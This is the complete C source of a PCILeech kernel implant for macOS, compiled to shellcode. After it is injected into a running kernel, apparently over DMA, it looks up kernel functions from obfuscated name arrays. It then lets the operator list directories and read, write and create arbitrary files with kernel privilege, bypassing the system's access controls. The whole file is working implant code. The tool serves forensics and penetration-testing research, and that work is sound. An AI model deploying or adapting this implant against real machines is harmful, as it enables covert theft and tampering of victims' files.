// macos_vfs.c : kernel code to support the PCILeech file system.
// Compatible with Apple macOS.
//
// (c) Ulf Frisk, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel macos_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel macos_vfs.c
// ml64 macos_common_a.asm /Femacos_vfs.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main macos_vfs.obj macos_common.obj
// shellcode64.exe -o macos_vfs.exe
// 

#include "macos_common.h"

//-----------------------------------------------------------------------------
// Core defines and typedefs shared between kernel implants and pcileech.
//-----------------------------------------------------------------------------

#define VFS_OP_MAGIC				0x79e720ad93aa130f
#define VFS_OP_CMD_LIST_DIRECTORY	1
#define VFS_OP_CMD_WRITE			2
#define VFS_OP_CMD_READ				3
#define VFS_OP_CMD_CREATE			4
#define VFS_OP_CMD_DELETE			5

#define VFS_FLAGS_FILE_NORMAL		0x01
#define VFS_FLAGS_FILE_DIRECTORY	0x02
#define VFS_FLAGS_FILE_SYMLINK		0x04
#define VFS_FLAGS_FILE_OTHER		0x08
#define VFS_FLAGS_UNICODE			0x10
#define VFS_FLAGS_EXIST_FILE		0x20
#define VFS_FLAGS_TRUNCATE_ON_WRITE	0x40
#define VFS_FLAGS_APPEND_ON_WRITE	0x80

typedef struct tdVFS_OPERATION {
	QWORD magic;
	QWORD op;
	QWORD flags;
	CHAR szFileName[MAX_PATH];
	WCHAR wszFileName[MAX_PATH];
	QWORD offset;
	QWORD cb;
	BYTE pb[];
} VFS_OPERATION, *PVFS_OPERATION;

typedef struct tdVFS_RESULT_FILEINFO {
	QWORD flags;
	QWORD tAccessOpt;
	QWORD tModifyOpt;
	QWORD tCreateOpt;
	QWORD dbg1;
	QWORD dbg2;
	QWORD cb;
	WCHAR wszFileName[MAX_PATH];
} VFS_RESULT_FILEINFO, *PVFS_RESULT_FILEINFO;

//-----------------------------------------------------------------------------
// Other required defines and typedefs.
//-----------------------------------------------------------------------------

#define O_ACCMODE		0x0003
#define O_RDONLY		0x0000
#define O_WRONLY		0x0001
#define O_RDWR			0x0002

#define O_NONBLOCK		0x0004
#define O_APPEND		0x0008
#define O_SHLOCK		0x0010
#define O_EXLOCK		0x0020
#define O_ASYNC			0x0040
#define O_SYNC			0x0080
#define O_NOFOLLOW		0x0100
#define O_CREAT			0x0200
#define O_TRUNC			0x0400
#define O_EXCL			0x0800
#define O_EVTONLY		0x8000
#define O_NOCTTY		0x20000
#define O_DIRECTORY		0x100000
#define O_SYMLINK		0x200000

#define VNODE_ATTR_va_data_size		(1LL<< 4)		/* 00000010 */
#define VNODE_ATTR_va_create_time	(1LL<<12)		/* 00001000 */
#define VNODE_ATTR_va_access_time	(1LL<<13)		/* 00002000 */
#define VNODE_ATTR_va_modify_time	(1LL<<14)		/* 00004000 */
#define VNODE_ATTR_va_name			(1LL<<25)		/* 02000000 */

struct attrlist {
	WORD bitmapcount;			/* number of attr. bit sets in list (should be 5) */
	WORD reserved;			/* (to maintain 4-byte alignment) */
	DWORD commonattr;			/* common attribute group */
	DWORD volattr;			/* Volume attribute group */
	DWORD dirattr;			/* directory attribute group */
	DWORD fileattr;			/* file attribute group */
	DWORD forkattr;			/* fork attribute group */
};

typedef struct attribute_set {
	DWORD commonattr;			/* common attribute group */
	DWORD volattr;			/* Volume attribute group */
	DWORD dirattr;			/* directory attribute group */
	DWORD fileattr;			/* file attribute group */
	DWORD forkattr;			/* fork attribute group */
} attribute_set_t;


typedef struct attrreference {
	DWORD attr_dataoffset;
	DWORD attr_length;
} attrreference_t;

struct timespec {
	QWORD	tv_sec;		// seconds
	QWORD	tv_nsec;	// nanoseconds
};

enum vtype {
	VNON,
	VREG, VDIR, VBLK, VCHR, VLNK,
	VSOCK, VFIFO, VBAD, VSTR, VCPLX
};

#define ATTR_BIT_MAP_COUNT			5
#define ATTR_CMN_NAME				0x00000001
#define ATTR_CMN_OBJTYPE			0x00000008
#define ATTR_CMN_CRTIME				0x00000200
#define ATTR_CMN_MODTIME			0x00000400
#define ATTR_CMN_ACCTIME			0x00001000
#define ATTR_CMN_RETURNED_ATTRS 	0x80000000	
#define ATTR_DIR_ENTRYCOUNT			0x00000002
#define ATTR_FILE_TOTALSIZE			0x00000002

struct vnode_attr {
	/* bitfields */
	QWORD	va_supported;
	QWORD	va_active;
	QWORD	unknown[64];
};

//-----------------------------------------------------------------------------
// Functions below.
//-----------------------------------------------------------------------------

typedef struct tdFN2 {
	QWORD vnode_lookup;
	QWORD vnode_put;
	QWORD vnode_setsize;
	QWORD vnode_open;
	QWORD vnode_close;
	QWORD VNOP_READ;
	QWORD VNOP_WRITE;
	QWORD VNOP_GETATTRLISTBULK;
	QWORD uio_addiov;
	QWORD uio_resid;
	QWORD vfs_context_current;
	QWORD uio_create;
	QWORD uio_free;
} FN2, *PFN2;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD i = 0, NAMES[sizeof(FN2) / sizeof(QWORD)], *pfn_qw = (PQWORD)pfn2;
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'l', 'o', 'o', 'k', 'u', 'p', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'p', 'u', 't', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 's', 'e', 't', 's', 'i', 'z', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'o', 'p', 'e', 'n', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'c', 'l', 'o', 's', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'V', 'N', 'O', 'P', '_', 'R', 'E', 'A', 'D', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'V', 'N', 'O', 'P', '_', 'W', 'R', 'I', 'T', 'E', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'V', 'N', 'O', 'P', '_', 'G', 'E', 'T', 'A', 'T', 'T', 'R', 'L', 'I', 'S', 'T', 'B', 'U', 'L', 'K', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'a', 'd', 'd', 'i', 'o', 'v', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'r', 'e', 's', 'i', 'd', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'f', 's', '_', 'c', 'o', 'n', 't', 'e', 'x', 't', '_', 'c', 'u', 'r', 'r', 'e', 'n', 't', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'c', 'r', 'e', 'a', 't', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'f', 'r', 'e', 'e', 0 };
	for(i = 0; i < sizeof(FN2) / sizeof(QWORD); i++) {
		pfn_qw[i] = LookupFunctionMacOS(pk->AddrKernelBase, (CHAR*)NAMES[i]);
		if(!pfn_qw[i]) { return FALSE; }
	}
	return TRUE;
}

QWORD UnixToWindowsFiletime(QWORD tv) {
	QWORD result = 11644473600ULL; // EPOCH DIFF
	result += tv;
	result *= 10000000ULL;
	return result;
}

STATUS VfsList(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	DWORD status = STATUS_SUCCESS;
	QWORD i, uio = 0, vnode = 0, vfs_current;
	PFNMACOS pfn1 = &pk->fn;
	PVFS_RESULT_FILEINFO pfi;
	QWORD qw, p, cfi = 0, pbRecordFull, cbRecordFull, pbRecord;
	attribute_set_t *pAttrSet;
	attrreference_t *pAttrRef;
	DWORD dw, eofflag, actualcount;
	struct timespec *pts;
	struct vnode_attr va;
	struct attrlist al;
	if(pk->dataOutExtraLengthMax < 0x00100000) {
		status = STATUS_FAIL_OUTOFMEMORY;
		goto fail;
	}
	vfs_current = SysVCall(pfn2->vfs_context_current);
	if(SysVCall(pfn2->vnode_lookup, pop->szFileName, 0, &vnode, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto fail;
	}
	SysVCall(pfn1->memset, &va, 0, sizeof(struct vnode_attr));
	// set attribute list with attributes that should be retrieved.
	SysVCall(pfn1->memset, &al, 0, sizeof(struct attrlist));
	al.bitmapcount = ATTR_BIT_MAP_COUNT;
	al.commonattr = ATTR_CMN_NAME | ATTR_CMN_RETURNED_ATTRS | ATTR_CMN_CRTIME | ATTR_CMN_MODTIME | ATTR_CMN_ACCTIME | ATTR_CMN_OBJTYPE;
	al.fileattr = ATTR_FILE_TOTALSIZE;
	al.dirattr = ATTR_DIR_ENTRYCOUNT;
	while(TRUE) {
		actualcount = 0;
		pbRecordFull = pk->DMAAddrVirtual + pk->dataOutExtraOffset + pk->dataOutExtraLengthMax - 0x00010000;
		SysVCall(pfn1->memset, pbRecordFull, 0, 0x00010000);
		uio = SysVCall(pfn2->uio_create, 1 /* count iov */, cfi /* offset */, 2 /* kernel addr */, 0 /* read */);
		if(SysVCall(pfn2->uio_addiov, uio, pbRecordFull, 0x00010000)) {
			status = STATUS_FAIL_FILE_CANNOT_OPEN;
			goto fail;
		}
		if(SysVCall(pfn2->VNOP_GETATTRLISTBULK, vnode, &al, &va, uio, NULL /* private */, 0 /* options */, &eofflag, &actualcount, vfs_current)) {
			status = STATUS_FAIL_FILE_CANNOT_OPEN;
			goto fail;
		}
		if(0 == actualcount) {
			break;
		}
		if((pk->dataOutExtraLengthMax - 0x00010000) < (cfi + actualcount) * sizeof(VFS_RESULT_FILEINFO)) {
			break;
		}
		for(p = 0; p < actualcount; p++) {
			pfi = (PVFS_RESULT_FILEINFO)(pk->DMAAddrVirtual + pk->dataOutExtraOffset + (p + cfi) * sizeof(VFS_RESULT_FILEINFO));
			SysVCall(pfn1->memset, pfi, 0, sizeof(VFS_RESULT_FILEINFO));
			cbRecordFull = *(PDWORD)pbRecordFull;
			pbRecord = pbRecordFull;
			pbRecordFull += cbRecordFull;
			pbRecord += sizeof(DWORD);
			pAttrSet = (attribute_set_t*)pbRecord;
			pbRecord += sizeof(attribute_set_t);
			if(pAttrSet->commonattr & ATTR_CMN_NAME) {
				pAttrRef = (attrreference_t*)pbRecord;
				pbRecord += sizeof(attrreference_t);
				qw = pAttrRef->attr_length;
				if(qw > MAX_PATH - 1) {
					qw = MAX_PATH - 1;
				}
				for(i = 0; i < qw; i++) {
					pfi->wszFileName[i] = *(PCHAR)((QWORD)pAttrRef + pAttrRef->attr_dataoffset + i);
				}
			}
			if(pAttrSet->commonattr & ATTR_CMN_OBJTYPE) {
				// vnode type
				dw = *(PDWORD)pbRecord;
				pbRecord += sizeof(DWORD);
				if(dw == VREG) {
					pfi->flags |= VFS_FLAGS_FILE_NORMAL;
				} else if(dw == VDIR) {
					pfi->flags |= VFS_FLAGS_FILE_DIRECTORY;
				} else if(dw == VLNK) {
					pfi->flags |= VFS_FLAGS_FILE_SYMLINK;
				} else {
					pfi->flags |= VFS_FLAGS_FILE_OTHER;
				}
			}
			if(pAttrSet->commonattr & ATTR_CMN_CRTIME) {
				pts = (struct timespec*)pbRecord;
				pbRecord += sizeof(struct timespec);
				pfi->tCreateOpt = UnixToWindowsFiletime(pts->tv_sec);
			}
			if(pAttrSet->commonattr & ATTR_CMN_MODTIME) {
				pts = (struct timespec*)pbRecord;
				pbRecord += sizeof(struct timespec);
				pfi->tModifyOpt = UnixToWindowsFiletime(pts->tv_sec);
			}
			if(pAttrSet->commonattr & ATTR_CMN_ACCTIME) {
				pts = (struct timespec*)pbRecord;
				pbRecord += sizeof(struct timespec);
				pfi->tAccessOpt = UnixToWindowsFiletime(pts->tv_sec);
			}
			if(pAttrSet->fileattr & ATTR_FILE_TOTALSIZE) {
				pfi->cb = *(PQWORD)pbRecord;
				pbRecord += sizeof(QWORD);
			}
		}
		SysVCall(pfn2->uio_free, uio);
		uio = 0;
		cfi += actualcount;
	}
	pk->dataOutExtraLength = cfi * sizeof(VFS_RESULT_FILEINFO);
fail:
	if(uio) { SysVCall(pfn2->uio_free, uio); }
	if(vnode) { SysVCall(pfn2->vnode_put, vnode); }
	return cfi ? STATUS_SUCCESS : status;
}

STATUS VfsDelete(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	UNREFERENCED_PARAMETER(pfn2);
	UNREFERENCED_PARAMETER(pop);
	return STATUS_FAIL_NOT_IMPLEMENTED;
}

STATUS VfsRead(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	DWORD status = STATUS_SUCCESS;
	QWORD uio = 0, vnode = 0, vfs_current;
	vfs_current = SysVCall(pfn2->vfs_context_current);
	if(SysVCall(pfn2->vnode_lookup, pop->szFileName, 0, &vnode, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto fail;
	}
	uio = SysVCall(pfn2->uio_create, 1 /* count iov */, pop->offset /* offset */, 2 /* kernel addr */, 0 /* read */);
	if(SysVCall(pfn2->uio_addiov, uio, pk->DMAAddrVirtual + pk->dataOutExtraOffset, pk->dataOutExtraLengthMax)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto fail;
	}
	if(SysVCall(pfn2->VNOP_READ, vnode, uio, 0, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto fail;
	}
	pk->dataOutExtraLength = pk->dataOutExtraLengthMax - SysVCall(pfn2->uio_resid, uio);
fail:
	if(uio) { SysVCall(pfn2->uio_free, uio); }
	if(vnode) { SysVCall(pfn2->vnode_put, vnode); }
	return status;
}

STATUS VfsWrite(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	DWORD status = STATUS_SUCCESS;
	QWORD uio = 0, vnode = 0, flags = 0, vfs_current;
	flags |= O_WRONLY;
	flags |= (pop->flags & VFS_FLAGS_TRUNCATE_ON_WRITE) ? O_TRUNC : 0;
	flags |= (pop->flags & VFS_FLAGS_APPEND_ON_WRITE) ? O_APPEND : 0;
	vfs_current = SysVCall(pfn2->vfs_context_current);
	if(SysVCall(pfn2->vnode_open, pop->szFileName, flags, 0, 0, &vnode, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto fail;
	}
	uio = SysVCall(pfn2->uio_create, 1 /* count iov */, pop->offset /* offset */, 2 /* kernel addr */, 1 /* write */);
	if(SysVCall(pfn2->uio_addiov, uio, pop->pb, pop->cb)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto fail;
	}
	if(SysVCall(pfn2->VNOP_WRITE, vnode, uio, 0, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto fail;
	}
	if(flags & O_TRUNC) {
		SysVCall(pfn2->vnode_setsize, vnode, pop->offset + pop->cb, 0, vfs_current);
	}
fail:
	if(uio) { SysVCall(pfn2->uio_free, uio); }
	if(vnode) { SysVCall(pfn2->vnode_close, vnode, 0x10000 /* descriptor written */, vfs_current); }
	return status;
}

STATUS VfsCreate(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	DWORD status = STATUS_SUCCESS;
	QWORD vnode = 0, vfs_current;
	vfs_current = SysVCall(pfn2->vfs_context_current);
	if(SysVCall(pfn2->vnode_open, pop->szFileName, O_CREAT | O_WRONLY | O_TRUNC, 0x1ff /*-rwxrwxrwx*/, 0, &vnode, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto fail;
	}
fail:
	if(vnode) { SysVCall(pfn2->vnode_close, vnode, 0x10000 /* descriptor written */, vfs_current); }
	return status;
}

VOID c_EntryPoint(PKMDDATA pk)
{
	PVFS_OPERATION pop;
	FN2 fn2;
	// initialize kernel functions
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	// setup references to in/out data and check validity
	pop = (PVFS_OPERATION)(pk->DMAAddrVirtual + pk->dataInExtraOffset);
	if((pk->dataInExtraLength < sizeof(VFS_OPERATION)) || (pop->magic != VFS_OP_MAGIC) || (pop->flags & VFS_FLAGS_UNICODE)) {
		pk->dataOut[0] = STATUS_FAIL_SIGNATURE_NOT_FOUND;
		return;
	}
	// take action
	if(pop->op == VFS_OP_CMD_LIST_DIRECTORY) {
		pk->dataOut[0] = VfsList(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_READ) {
		pk->dataOut[0] = VfsRead(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_WRITE) {
		pk->dataOut[0] = VfsWrite(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_CREATE) {
		pk->dataOut[0] = VfsCreate(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_DELETE) {
		pk->dataOut[0] = VfsDelete(pk, &fn2, pop);
		return;
	}
}
